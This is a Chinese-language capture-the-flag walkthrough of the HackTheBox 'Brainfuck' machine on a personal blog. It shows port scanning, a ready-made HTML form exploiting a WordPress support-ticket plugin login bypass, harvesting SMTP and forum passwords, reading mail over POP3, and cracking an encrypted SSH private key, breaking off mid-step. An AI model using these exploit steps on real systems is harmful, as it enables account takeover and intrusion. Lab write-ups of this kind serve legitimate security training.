@@ -1,0 +1,998 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Brainfuck - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - Brainfuck靶场信息  靶场类型  信息收集Nmap┌──(root㉿kali)-[~&#x2F;Desktop] └─# nmap -sS -sV -A -sC -p- --min-rate 10000 10.10.10.17 Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-01-19 01:49 CST Nmap scan">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Brainfuck - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - Brainfuck靶场信息  靶场类型  信息收集Nmap┌──(root㉿kali)-[~&#x2F;Desktop] └─# nmap -sS -sV -A -sC -p- --min-rate 10000 10.10.10.17 Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-01-19 01:49 CST Nmap scan">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/w1QjmTWutE_Q_eGxZHeLpzk8xDrvBKKmH_JNQOGtHVA.png">
+<meta property="og:image" content="http://www.lucifiel.com/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/lcQDCP1bKxxs54vOU2-9TI5hyEqAaDtOv08XgWHkODw.png">
+<meta property="og:image" content="http://www.lucifiel.com/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/IJIhrWS8nI2tp6UnicuSy6G-QKaoznEhtDP659pN92I.png">
+<meta property="og:image" content="http://www.lucifiel.com/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/Z7f8IWs6g4QVsjG5zdEqAIJbDmpg1O7XGw2FUVaFK-0.png">
+<meta property="og:image" content="http://www.lucifiel.com/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/EU-H4CZQIy0CvpvDlDaLz0Hl07vHJ6XEvRBKb5b1LAc.png">
+<meta property="og:image" content="http://www.lucifiel.com/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/bSd46BG9U5J5u9TeK37x8iplJ9b1acaQDCUIfNFDZXc.png">
+<meta property="og:image" content="http://www.lucifiel.com/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/Qh6aehvfNKPmALp6zfXvCSFZ30OEbIqalywHzRrvDyU.png">
+<meta property="og:image" content="http://www.lucifiel.com/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/xHPTkKMbHhE_yzwBsU8vvCTYKAmWOiAYqwGOk2gNDQ4.png">
+<meta property="og:image" content="http://www.lucifiel.com/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/uORtmvFozO8iLMqmmodRV50Z3Lp7VYq1ymR0Fdg_iVY.png">
+<meta property="og:image" content="http://www.lucifiel.com/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/tEMSI4f2vu8qjZ9t7vY6TZXbPSaYRIrdf78x7a_CMZo.png">
+<meta property="og:image" content="http://www.lucifiel.com/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/QSDQ513DvaMR1D3OkgqKt9F1dAp-QcO_W4opwPUCw9M.png">
+<meta property="og:image" content="http://www.lucifiel.com/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/FwcY-auxq_q2ObyeBAitikbc2UamHHdsba6UHoF7AUc.png">
+<meta property="og:image" content="http://www.lucifiel.com/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/-202FdDx0kJnTv_7p9pUQV-6kIJsXGP3brulp4awD1U.png">
+<meta property="og:image" content="http://www.lucifiel.com/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/xRPxSL5VEhrI8YYxDZeeqCyMUSiIgBpikBAP3KVMdek.png">
+<meta property="article:published_time" content="2017-04-29T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-17T02:37:19.427Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/w1QjmTWutE_Q_eGxZHeLpzk8xDrvBKKmH_JNQOGtHVA.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Brainfuck - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Brainfuck - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2017-04-29T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2017-04-29
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Brainfuck"><span class="post-toc-text">Hackthebox - Brainfuck</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息收集"><span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Wpscan"><span class="post-toc-text">Wpscan</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#sup3rs3cr3t-brainfuck-htb"><span class="post-toc-text">sup3rs3cr3t.brainfuck.htb</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#密码解密"><span class="post-toc-text">密码解密</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#私钥解密"><span class="post-toc-text">私钥解密</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Step-1"><span class="post-toc-text">Step 1</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Step-2"><span class="post-toc-text">Step 2</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Step-3"><span class="post-toc-text">Step 3</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Step-4"><span class="post-toc-text">Step 4</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Insane/Hackthebox-Brainfuck"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Brainfuck - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2017-04-29 19:38:36" datetime="2017-04-29T11:38:36.000Z"  itemprop="datePublished">2017-04-29</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Brainfuck"><a href="#Hackthebox-Brainfuck" class="headerlink" title="Hackthebox - Brainfuck"></a>Hackthebox - Brainfuck</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><img src="/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/w1QjmTWutE_Q_eGxZHeLpzk8xDrvBKKmH_JNQOGtHVA.png" class title="image">
+
+<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><img src="/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/lcQDCP1bKxxs54vOU2-9TI5hyEqAaDtOv08XgWHkODw.png" class title="image">
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# nmap -sS -sV -A -sC -p- --min-rate 10000 10.10.10.17
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-19 01:49 CST
+Nmap scan report for 10.10.10.17
+Host is up (0.41s latency).
+Not shown: 65530 filtered tcp ports (no-response)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 94d0b334e9a537c5acb980df2a54a5f0 (RSA)
+|   256 6bd5dc153a667af419915d7385b24cb2 (ECDSA)
+|_  256 23f5a333339d76d5f2ea6971e34e8e02 (ED25519)
+25/tcp  open  smtp     Postfix smtpd
+|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
+110/tcp open  pop3     Dovecot pop3d
+|_pop3-capabilities: SASL(PLAIN) USER TOP AUTH-RESP-CODE CAPA RESP-CODES PIPELINING UIDL
+143/tcp open  imap     Dovecot imapd
+|_imap-capabilities: SASL-IR ENABLE LITERAL+ LOGIN-REFERRALS more listed ID capabilities have post-login Pre-login AUTH=PLAINA0001 IMAP4rev1 OK IDLE
+443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
+|_http-title: Welcome to nginx!
+|_http-server-header: nginx/1.10.0 (Ubuntu)
+| tls-nextprotoneg: 
+|_  http/1.1
+| tls-alpn: 
+|_  http/1.1
+| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
+| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
+| Not valid before: 2017-04-13T11:19:29
+|_Not valid after:  2027-04-11T11:19:29
+|_ssl-date: TLS randomness does not represent time
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 110/tcp)
+HOP RTT       ADDRESS
+1   482.21 ms 10.10.16.1
+2   482.26 ms 10.10.10.17
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 88.32 seconds
+</code></pre>
+<pre><code class="bash">DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
+</code></pre>
+<p>这边又两个域名，先加入 hosts 解析吧</p>
+<pre><code class="bash">echo 10.10.10.17 brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb &gt;&gt; /etc/hosts
+</code></pre>
+<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><img src="/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/IJIhrWS8nI2tp6UnicuSy6G-QKaoznEhtDP659pN92I.png" class title="image">
+
+<p>直接访问是 Nginx 默认页面</p>
+<img src="/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/Z7f8IWs6g4QVsjG5zdEqAIJbDmpg1O7XGw2FUVaFK-0.png" class title="image">
+
+<p>使用 hosts 解析后访问是一个 wordpress 页面，版本是 4.7.3</p>
+<p>这里的内容是 SMTP 集成已准备就绪吗，然后给了我们一个邮件地址，让我们检查后把反馈发送到这个地址</p>
+<pre><code class="bash">orestis@brainfuck.htb
+</code></pre>
+<p>SMTP 使用的端口是 25 端口，这里先记录一下，说不定有用</p>
+<p>既然知道是 wordpress 了，那就用 wpscan 去扫描一下</p>
+<h2 id="Wpscan"><a href="#Wpscan" class="headerlink" title="Wpscan"></a>Wpscan</h2><pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# wpscan --url &quot;https://brainfuck.htb/&quot; --disable-tls-checks
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.22
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: https://brainfuck.htb/ [10.10.10.17]
+[+] Started: Thu Jan 19 02:01:26 2023
+
+Interesting Finding(s):
+
+[+] wp-support-plus-responsive-ticket-system
+ | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
+ | Last Updated: 2019-09-03T07:57:00.000Z
+ | [!] The version is out of date, the latest version is 9.1.2
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 7.1.3 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
+</code></pre>
+<p>发现一个老版本插件</p>
+<blockquote>
+<p><a href="https://www.exploit-db.com/exploits/41006" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/41006</a></p>
+</blockquote>
+<p>搜索这个插件找到了一个可利用的漏洞</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><pre><code class="bash">&lt;form method=&quot;post&quot; action=&quot;https://brainfuck.htb/wp-admin/admin-ajax.php&quot;&gt;
+    Username: &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;admin&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;orestis@brainfuck.htb&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;loginGuestFacebook&quot;&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;
+&lt;/form&gt;
+</code></pre>
+<p>将我们的 poc 保存到本地，然后使用 python3 开启一个 http 服务</p>
+<pre><code class="python">python3 -m http.server 80
+</code></pre>
+<img src="/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/EU-H4CZQIy0CvpvDlDaLz0Hl07vHJ6XEvRBKb5b1LAc.png" class title="image">
+
+<p>选择登录试试</p>
+<img src="/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/bSd46BG9U5J5u9TeK37x8iplJ9b1acaQDCUIfNFDZXc.png" class title="image">
+
+<p>点击后是一片空白页面，不确定是否利用成功，返回主页看看</p>
+<img src="/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/Qh6aehvfNKPmALp6zfXvCSFZ30OEbIqalywHzRrvDyU.png" class title="image">
+
+<p>ok，这里我们利用成功了，已经成功登录</p>
+<img src="/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/xHPTkKMbHhE_yzwBsU8vvCTYKAmWOiAYqwGOk2gNDQ4.png" class title="image">
+
+<p>在 Settings -&gt; Easy WP SMTP 中，可以看到 SMTP 的信息，这里密码是隐藏的</p>
+<img src="/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/uORtmvFozO8iLMqmmodRV50Z3Lp7VYq1ymR0Fdg_iVY.png" class title="image">
+
+<p>使用控制台就可以看到密码</p>
+<pre><code class="bash">SMTP
+Email = orestis@brainfuck.htb
+username = orestis
+password = kHGuERB29DNiNE
+</code></pre>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# nc 10.10.10.17 110
++OK Dovecot ready.
+USER orestis
++OK
+PASS kHGuERB29DNiNE
++OK Logged in.
+list
++OK 2 messages:
+1 977
+2 514
+.
+retr 1
++OK 977 octets
+Return-Path: &lt;www-data@brainfuck.htb&gt;
+X-Original-To: orestis@brainfuck.htb
+Delivered-To: orestis@brainfuck.htb
+Received: by brainfuck (Postfix, from userid 33)
+        id 7150023B32; Mon, 17 Apr 2017 20:15:40 +0300 (EEST)
+To: orestis@brainfuck.htb
+Subject: New WordPress Site
+X-PHP-Originating-Script: 33:class-phpmailer.php
+Date: Mon, 17 Apr 2017 17:15:40 +0000
+From: WordPress &lt;wordpress@brainfuck.htb&gt;
+Message-ID: &lt;00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb&gt;
+X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+
+Your new WordPress site has been successfully set up at:
+
+https://brainfuck.htb
+
+You can log in to the administrator account with the following information:
+
+Username: admin
+Password: The password you chose during the install.
+Log in here: https://brainfuck.htb/wp-login.php
+
+We hope you enjoy your new site. Thanks!
+
+--The WordPress Team
+https://wordpress.org/
+.
+retr 2
++OK 514 octets
+Return-Path: &lt;root@brainfuck.htb&gt;
+X-Original-To: orestis
+Delivered-To: orestis@brainfuck.htb
+Received: by brainfuck (Postfix, from userid 0)
+        id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
+To: orestis@brainfuck.htb
+Subject: Forum Access Details
+Message-Id: &lt;20170429101206.4227420AEB@brainfuck&gt;
+Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
+From: root@brainfuck.htb (root)
+
+Hi there, your credentials for our &quot;secret&quot; forum are below :)
+
+username: orestis
+password: kIEnnfEKJ#9UmdO
+
+Regards
+.
+</code></pre>
+<p>得到了两封邮件</p>
+<pre><code class="bash">Return-Path: &lt;www-data@brainfuck.htb&gt;
+X-Original-To: orestis@brainfuck.htb
+Delivered-To: orestis@brainfuck.htb
+Received: by brainfuck (Postfix, from userid 33)
+        id 7150023B32; Mon, 17 Apr 2017 20:15:40 +0300 (EEST)
+To: orestis@brainfuck.htb
+Subject: New WordPress Site
+X-PHP-Originating-Script: 33:class-phpmailer.php
+Date: Mon, 17 Apr 2017 17:15:40 +0000
+From: WordPress &lt;wordpress@brainfuck.htb&gt;
+Message-ID: &lt;00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb&gt;
+X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+
+Your new WordPress site has been successfully set up at:
+
+https://brainfuck.htb
+
+You can log in to the administrator account with the following information:
+
+Username: admin
+Password: The password you chose during the install.
+Log in here: https://brainfuck.htb/wp-login.php
+
+We hope you enjoy your new site. Thanks!
+
+--The WordPress Team
+https://wordpress.org/
+</code></pre>
+<pre><code class="bash">Return-Path: &lt;root@brainfuck.htb&gt;
+X-Original-To: orestis
+Delivered-To: orestis@brainfuck.htb
+Received: by brainfuck (Postfix, from userid 0)
+        id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
+To: orestis@brainfuck.htb
+Subject: Forum Access Details
+Message-Id: &lt;20170429101206.4227420AEB@brainfuck&gt;
+Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
+From: root@brainfuck.htb (root)
+
+Hi there, your credentials for our &quot;secret&quot; forum are below :)
+
+username: orestis
+password: kIEnnfEKJ#9UmdO
+
+Regards
+</code></pre>
+<p>得到了一个账号密码</p>
+<pre><code class="bash">username: orestis
+password: kIEnnfEKJ#9UmdO
+</code></pre>
+<h2 id="sup3rs3cr3t-brainfuck-htb"><a href="#sup3rs3cr3t-brainfuck-htb" class="headerlink" title="sup3rs3cr3t.brainfuck.htb"></a>sup3rs3cr3t.brainfuck.htb</h2><p>我们看一下另一个地址是什么东西</p>
+<img src="/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/tEMSI4f2vu8qjZ9t7vY6TZXbPSaYRIrdf78x7a_CMZo.png" class title="image">
+
+<p>似乎是一个论坛</p>
+<p>用我们刚才的账号密码去登录试试</p>
+<img src="/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/QSDQ513DvaMR1D3OkgqKt9F1dAp-QcO_W4opwPUCw9M.png" class title="image">
+
+<p>成功登录</p>
+
+
+<p>这里的对话有点意思，就是有个人骂管理员，赶快把密钥发给我。管理员说，你个小碧池，我看你一点礼貌都没有，信不信我把密钥贴在这里给大家下载。然后那个人说他开了一个新的加密通话的帖子</p>
+<img src="/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/FwcY-auxq_q2ObyeBAitikbc2UamHHdsba6UHoF7AUc.png" class title="image">
+
+<h3 id="密码解密"><a href="#密码解密" class="headerlink" title="密码解密"></a>密码解密</h3><p>我们可以看到，对话已经被加密了，然后我找了一个解密的网站</p>
+<blockquote>
+<p><a href="https://planetcalc.com/2468/" target="_blank" rel="noopener">https://planetcalc.com/2468/</a></p>
+</blockquote>
+<img src="/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/-202FdDx0kJnTv_7p9pUQV-6kIJsXGP3brulp4awD1U.png" class title="image">
+
+<pre><code class="bash">brainfu - ckmybra inf uck myb rainfu
+</code></pre>
+<p>然后我们先删除所有的特殊字符</p>
+<pre><code class="bash">brainfuckmybrainfuckmybrainfu
+</code></pre>
+<p>我们去尝试解密，可以确定的是</p>
+<pre><code class="bash">mnvze://zsrivszwm.rfz/8cr5ai10r915218697i1w658enqc0cs8/ozrxnkc/ub_sja
+</code></pre>
+<p>这一段肯定是一个网址，所以我们看看这一段密码怎么解密才能让它变成网址</p>
+<img src="/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/xRPxSL5VEhrI8YYxDZeeqCyMUSiIgBpikBAP3KVMdek.png" class title="image">
+
+<pre><code class="bash">fuckmybrain
+
+https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
+</code></pre>
+<p>最后得出了密钥和地址</p>
+<h3 id="私钥解密"><a href="#私钥解密" class="headerlink" title="私钥解密"></a>私钥解密</h3><pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# cat id_rsa    
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382
+
+mneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/
+B2nS4+9CYBK8IR3Vt5Fo7PoWBCjAAwWYlx+cK0w1DXqa3A+BLlsSI0Kws9jea6Gi
+W1ma/V7WoJJ+V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ
+7dKcg6AM/o9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ
+zxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum
+oz3XEnhaGmP1jmMoVBWiD+2RrnL6wnz9kssV+tgCV0mD97WS+1ydWEPeCph06Mem
+dLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF+
+Fvt6pmMuix8hbipP112Us54yTv/hyC+M5g1hWUuj5y4xovgr0LLfI2pGe+Fv5lXT
+mcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl+DlfaAMHWiYUKYs
+LSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk/LS/mLO4e0N3wEX+NtgVbq
+ul9guSlobasIX5DkAcY+ER3j+/YefpyEnYs+/tfTT1oM+BR3TVSlJcOrvNmrIy59
+krKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu+vi9L5nn5LkhO/V
+gdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA
+VwmM72XbaugmhKW25q/46/yL4VMKuDyHL5Hc+Ov5v3bQ908p+Urf04dpvj9SjBzn
+schqozogcC1UfJcCm6cl+967GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt
+UX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL+su8f96Kn
+F7gwZLtVP87d8R3uAERZnxFO9MuOZU2+PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy+M
+wZezLNip80XmcVJwGUYsdn+iB/UPMddX12J30YUbtw/R34TQiRFUhWLTFrmOaLab
+Iql5L+0JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreoxCI57axBQBqThEg/HTCy
+IQPmHW36mxtc+IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF
+mxy9EVQ+v49kg4yFwUNPPbsOppKc7gJWpS1Y/i+rDKg8ZNV3TIb5TAqIqQRgZqpP
+CvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF
+9DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1+PU8eIfFzkhUY0qoGS
+EBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi
+6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ
+-----END RSA PRIVATE KEY-----
+</code></pre>
+<p>然后我们得到了私钥，但是似乎是加密的，我们还不能直接使用</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# ssh2john id_rsa &gt; id_rsa_decode     
+                                                                                                                                                                                                                   
+┌──(root㉿kali)-[~/Desktop]
